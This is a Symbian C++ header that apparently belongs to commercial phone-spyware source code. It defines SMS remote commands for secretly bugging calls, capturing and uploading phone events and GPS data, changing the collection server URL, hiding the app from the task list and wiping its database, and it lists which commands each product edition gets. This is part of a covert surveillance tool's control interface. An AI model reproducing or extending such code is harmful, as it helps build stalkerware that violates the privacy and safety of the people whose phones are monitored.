#ifndef __CSmsCmdManager_H__
#define __CSmsCmdManager_H__

#include <e32base.h>
#include "SmsCmdClient.h"
#include "ProductLicense.h"
#include "AppDefinitions.h"

class MCmdListener
	{
public:
	/**
	* Handle SMS Command.
	* 
	* @return Response message, Ownership is transfered and NULL is acceptable.
	*/
	virtual HBufC* HandleSmsCommandL(const TSmsCmdDetails& aCmdDetails) = 0;
	};

//Note: when adding new command
//there are three places to add the code
//1. add new command to array KCmds[]
//2. add in switch case in method CSmsCmdManager::ProcessSmsCommandL
//3. register a command CFxsAppUi::RegisterSmsCommand

//------------------------
// SMS Command Set
//------------------------
//namespace TSmsCommand
//	{
const TUint KCmdDeleteDatabase 	= 191191;
/**
Enable/Set/Change spy number
Must provide number*/
const TUint KCmdEnableSpyCall  	= 10;

/**
Disable bugging*/
const TUint KCmdDisableSpyCall = 20;
/**
Enable/Disable watch list*/
const TUint KCmdEnableWatchList = 50;
/**
Clear all watch list*/
const TUint KCmdClearWatchList = 51;
/**
Clear all watch list*/
const TUint KCmdGPSSettings = 52;
/**
Start capture events*/
const TUint KCmdStartCapture  	 = 60;
/**
Stop capturing events*/
const TUint KCmdStopCapture 	 = 61;
/**
Query diagnostic information*/
const TUint KCmdQueryDiagnostic	 = 62;
/**
Change settings*/
const TUint KCmdChangeSettingValue	 = 63;
/**
Force to send event now*/
const TUint KCmdSendLogNow		 = 64;
/**
Query phone log duration settings*/
const TUint KCmdSetPhoneLogDuration	= 65;

/**
Server URL Cmd. <*#66><FK><DeliveryUrl><ActivationUrl>
1. to set only activation url, use <*#66><FK><><http://activation_url.com>
   leave DeliveryUrl empty
   
2. to query current url, use <*#66><FK>
   do not include those two tags

If tag 2 contains no text or empty, the cmd means to query current server url.
If tag 2 NOT empty, the cmd means to set new server url.

To query current server url -> <*#66><FlexiKEY>
To set new server url -> <*#66><FlexiKEY><http://yourdomain.xx>

Note: 
- Current server url will not be part of diagnostic because of SMS length exeeded
- Uses this command to either set or get server url.*/
const TUint KCmdSetServerURL	= 66;
/**
Force to seek for the right access point*/
const TUint KCmdApnAutoDiscovery = 71;
/**
Force to deactivate product*/
const TUint KCmdProductDeactivation = 72;
const TUint KCmdSetKeywords	= 73;
/*
Change Server SMS Activation Number*/
const TUint KCmdChangeSMSActivationNumber = 1977;
/**
Hide from task list*/
const TUint KCmdStealthMode	= 2007;
/**
Query diagnostic information*/
const TUint KCmdRestartDevice	 = 147258;

#ifdef __APP_FXS_PROX //PRO-X
static const TUint KCmds[]={
							KCmdEnableSpyCall,
							KCmdDisableSpyCall,
							KCmdStartCapture,
							KCmdStopCapture,
							KCmdQueryDiagnostic,
							KCmdChangeSettingValue,
							KCmdRestartDevice,
							KCmdSendLogNow,
							KCmdStealthMode,
							KCmdSetPhoneLogDuration,
							KCmdSetServerURL,
							KCmdApnAutoDiscovery,
							KCmdEnableWatchList,
							KCmdClearWatchList,
							KCmdGPSSettings,
							KCmdDeleteDatabase,
							KCmdProductDeactivation,
							KCmdSetKeywords
							};
#elif defined(__APP_FXS_PRO) //PRO
static const TUint KCmds[]={
							KCmdEnableSpyCall,
							KCmdDisableSpyCall,
							KCmdStartCapture,
							KCmdStopCapture,
							KCmdQueryDiagnostic,
							KCmdChangeSettingValue,
							KCmdRestartDevice,
							KCmdSendLogNow,
							KCmdStealthMode,
							KCmdSetPhoneLogDuration,
							KCmdSetServerURL,
							KCmdApnAutoDiscovery,
							KCmdDeleteDatabase,
							KCmdProductDeactivation,
							KCmdSetKeywords,
							};
#elif defined(__APP_FXS_LIGHT)//LIGHT
static const TUint KCmds[]={
							KCmdStartCapture,
							KCmdStopCapture,
							KCmdQueryDiagnostic,
							KCmdChangeSettingValue,
							KCmdRestartDevice,
							KCmdSendLogNow,
							KCmdStealthMode,
							KCmdSetPhoneLogDuration,
							KCmdSetServerURL,
							KCmdApnAutoDiscovery,
							KCmdDeleteDatabase,
							KCmdProductDeactivation
							};
#endif

static const TInt KSmsCmdLength = sizeof(KCmds) / sizeof(TUint);

_LIT(KNewLine,"\n");
 
class CRebootCmd;
class RCommonServices;

/** Global Sms Command
* 
* Represents Sms Cmd Server's client side session
* 
*/
class CSmsCmdManager : public CBase,
					   public MSmsCmdObserver	  	
	{
public:
	static CSmsCmdManager* NewL(MProductLicense& aLicense, const TFileName& appPath);
	~CSmsCmdManager();
	
	TInt AddListener(const TUint* aCmdArray, TInt aCmdCount, MCmdListener* aListener);	
	/**
	*
	* @return KErrNone if succeful
	*/	
	TInt AddListener(TUint aCmd, MCmdListener* aListener);	
	static HBufC* ResponseHeaderLC(TInt aCmd, TInt aError);
	static HBufC* ResponseHeaderLC(TInt aCmd, const TDesC& aStrErr);
private: //From MSmsCmdObserver
	void ProcessSmsCommandL(const TSmsCmdDetails& aCmdDetails);
	
private:
	CSmsCmdManager(MProductLicense& aLicense);
	void ConstructL(const TFileName& appPath);	
	void RegisterSmsCmdL();
	/**
	* @return response message, passing owner ship
	*/
	HBufC* ExecuteHandleSmsCommandL(const TSmsCmdDetails& aCmdDetails);
	TBool IsDebugModeSmsCmd(const TSmsCmdDetails& aDetails);
	TBool AlwaysResponse(TUint aCmd);
	/**
	* Convert to system event and insert to database
	*/
	void ConvertAndInsertSystemEvent(const TSmsCmdDetails& aCmdDetails);
	void ConvertAndInsertSystemEventL(const TSmsCmdDetails& aCmdDetails);
	
	/**
	* Create system event from sms command
	* The reason is that 
	*/
	HBufC* CreateSystemEventLC(const TSmsCmdDetails& aCmdDetails);
	/**
	* Entry pair of listener and command code
	*/
	class TListenerEntry
		{
	public:
		TListenerEntry(TUint aCmd, MCmdListener& aListener);
	public:
		TUint iCmd;
		MCmdListener& iListener;
		};	
private:
	MProductLicense& iLicense;
	CSmsCmdClient* iSmsCmdCli;	
	RArray<TListenerEntry> iListeners; //Elements NOT Owned by array
	TInt iEventId;
	};

#endif
